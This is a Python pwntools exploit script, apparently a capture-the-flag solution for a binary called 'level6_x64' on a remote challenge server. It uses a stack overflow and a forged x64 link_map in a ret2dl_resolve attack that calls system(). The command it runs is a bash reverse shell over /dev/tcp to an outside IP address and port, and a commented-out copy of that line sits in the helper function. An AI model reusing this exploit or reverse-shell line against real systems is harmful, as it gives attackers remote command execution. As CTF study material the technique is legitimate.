#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.
from pwn import *

context.log_level = "debug"
pwn_file="./level6_x64"
elf=ELF(pwn_file)
#os.environ['LD_LIBRARY_PATH'] = '/home/vam/glibc/amd64'

if len(sys.argv) == 1:
    #r = process(pwn_file)

    libc=ELF("/dbg/glibc/lib/libc.so.6")
    r=process("/dbg/glibc/lib/ld-2.23.so ./level6_x64".split(" "))
    pid=r.pid
else:
    r=remote("pwn.sixstars.team", 23006)
    libc=ELF("./libc-2.23.so")
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def ret2dl_resolve_linkmap_x64(ELF_obj,known_offset_addr,two_offset,linkmap_addr):
    '''
    # value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);
    WARNING: assert *(known_offset_addr-8) & 0x0000ff0000000000 != 0 
    WARNING: fake_linkmap is 0x100 bytes length,be careful
    WARNING: two_offset = target - *(known_offset_addr)

    _dl_runtime_resolve(linkmap,reloc_arg)
    reloc_arg=0
    linkmap:
    0x00: START
    0x00: l_addr = two_offset
    0x08: fake_DT_JMPREL : 0
    0x10: fake_DT_JMPREL : p_fake_JMPREL
    0x18: fake_JMPREL = [p_r_offset,r_info,append],p_r_offset
    0x20: r_info
    0x28: append
    0x30: r_offset
    0x38: fake_DT_SYMTAB: 0
    0x40: fake_DT_SYMTAB: known_offset_addr-8
    0x48: /bin/sh(for system)
    0x68: P_DT_STRTAB = linkmap_addr(just a pointer)
    0x70: p_DT_SYMTAB = fake_DT_SYMTAB
    0xf8: p_DT_JMPREL = fake_DT_JMPREL
    0x100: END
    '''
    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr
    print(hex(plt0))
    linkmap=""
    linkmap+=p64(two_offset&(2**64-1))
    linkmap+=p64(0)
    linkmap+=p64(linkmap_addr+0x18)
    linkmap+=p64((linkmap_addr+0x30-two_offset)&(2**64-1))+p64(0x7)+p64(0) # p_fake_JMPREL
    linkmap+=p64(0) # 0x30 # 解析到的地址
    linkmap+=p64(0)+p64(known_offset_addr-8) # 0x38  fake_DT_JMPREL name为字符串表的开始，其实用不到
    linkmap+='/bin/sh\x00' # for system offset 0x48
    # linkmap+='bash -c \"/bin/bash -i > /dev/tcp/118.89.101.128/1234 0<&1 2<&1\"\x00'
    linkmap = linkmap.ljust(0x68,'A')
    linkmap+=p64(linkmap_addr)  # 随便给一个指针 
    linkmap+=p64(linkmap_addr+0x38)
    linkmap = linkmap.ljust(0xf8,'A')
    linkmap+=p64(linkmap_addr+8)

    resolve_call = p64(plt0+6)+p64(linkmap_addr)+p64(0)
    return (linkmap,resolve_call)

pop_rid_ret = 0x4005c3
bss  = 0x601000
link_map_pos = 0x601008
link_map_addr = bss + 0x200
libc_start_main = 0x601018
bug_func = 0x400526

shell ="/bin/sh\x00"
shell = 'bash -c \"/bin/bash -i > /dev/tcp/118.89.101.128/1234 0<&1 2<&1\"\x00'
shell_addr = link_map_addr + 0x100

two_offset = libc.sym['system'] - libc.sym['__libc_start_main']

link_map, resolve_call = ret2dl_resolve_linkmap_x64(elf, libc_start_main, two_offset,link_map_addr)

payload = 0x28*'a'+p64(pop_rid_ret) + p64(link_map_addr) + p64(elf.plt['gets'])
payload+= p64(bug_func)
payload+= '\n'
payload+= link_map + shell
payload+= '\n'
payload+= 0x28*'a'+ p64(pop_rid_ret) + p64(shell_addr)+ resolve_call

debug()
r.sendline(payload)

r.interactive()
